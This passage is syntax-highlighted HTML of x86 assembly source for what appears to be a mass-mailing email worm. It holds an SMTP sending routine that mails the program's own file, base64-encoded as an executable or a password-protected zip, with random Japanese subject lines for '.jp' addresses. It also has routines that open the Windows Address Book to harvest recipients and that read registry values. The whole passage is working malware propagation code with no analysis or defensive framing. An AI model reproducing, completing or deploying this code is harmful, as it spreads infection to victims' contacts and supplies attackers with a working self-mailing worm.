    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;  mail address</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00706a2eh</span><span class="sc0"> </span><span class="sc1">;  .jp</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">jflag</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc1">;;  DATA</span><span class="sc0">
    </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_DATA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_DATA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;;  BODY FROM</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_BODY_FROM</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_BODY_FROM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">


    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc1">;;  BODY TO</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_BODY_TO</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_BODY_TO</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc1">;;  BODY SUBJECT</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">jflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@jsubject</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_BODY_SUBJECT</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_BODY_SUBJECT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@body</span><span class="sc0">

    </span><span class="sc5">@@jsubject</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  gen subject</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_jsubject_1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_jsubject_1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">num_of_jsub</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rng</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">japanese_subjects</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_jsubject_2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_jsubject_2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc5">@@body</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_MIME_h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_MIME_h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rng</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@send_zip</span><span class="sc0">

    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_MIME_exe</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_MIME_exe</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">b64thisfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@mime_end</span><span class="sc0">

    </span><span class="sc5">@@send_zip</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_zip_password</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_zip_password</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_MIME_zip</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_MIME_zip</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">b64zippedfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc5">@@mime_end</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_MIME_e</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_MIME_e</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_DOT_CRLF</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_DOT_CRLF</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;; QUIT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_QUIT</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_QUIT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;  -------------------------------------------------</span><span class="sc0">
</span><span class="sc5">close_mapped_file</span><span class="sc4">:</span><span class="sc0">  
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmmap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmmapview</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;  -------------------------------------------------</span><span class="sc0">
</span><span class="sc5">open_wab</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">wab4_path</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmmap</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmmapview</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;  ----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">g_send</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  in</span><span class="sc0">
    </span><span class="sc1">;;   ecx = size</span><span class="sc0">
    </span><span class="sc1">;;   esi = ptr to data</span><span class="sc0">
    </span><span class="sc1">;;  out</span><span class="sc0">
    </span><span class="sc1">;;   eax = ret value of send()</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">g_recv</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  out</span><span class="sc0">
    </span><span class="sc1">;;   error -&gt; eax=-1  success -&gt; eax = 0</span><span class="sc0">
    </span><span class="sc5">@@again</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">recv_buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">recv</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@recv_error</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@again</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@recv_error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;  ------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">read_reg</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@ptr_subkey</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@ptr_value_name</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@ptr_data_buf</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@ptr_data_buf_size</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@ptr_subkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@ptr_data_buf_size</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@ptr_data_buf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@ptr_value_name</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegQueryValueExA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">RegCloseKey</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">endp</span><span class="sc0">
    
</span><span class="sc1">;;;  -----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">create_base64enc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">b64thisfile</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">thisfilename</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_b64main</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">b64zippedfile</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">zipfilepath</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_b64main</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">create_b64main</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@filename</span><span class="sc0">      </span><span class="sc1">;  offset of filename</span><span class="sc0">
    </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">@@ptr_b64</span><span class="sc0">       </span><span class="sc1">;  ptr to ptr to buffer address of base64 encoded</span><span class="sc0">
    
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@@filename</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@error</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hfile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetFileSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hvmem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
